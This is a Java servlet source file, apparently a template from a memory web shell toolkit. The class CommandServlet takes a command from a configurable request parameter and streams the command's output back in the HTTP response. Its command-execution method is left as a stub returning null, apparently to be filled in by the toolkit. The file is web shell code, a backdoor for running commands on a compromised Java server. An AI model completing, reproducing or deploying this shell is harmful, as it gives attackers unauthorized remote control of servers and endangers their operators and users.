package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/12/15
 */
public class CommandServlet extends HttpServlet {
    private static String paramName;

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String cmd) throws Exception {
        return null;
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String cmd = getParam(request.getParameter(paramName));
        try {
            if (cmd != null) {
                InputStream inputStream = getInputStream(cmd);
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
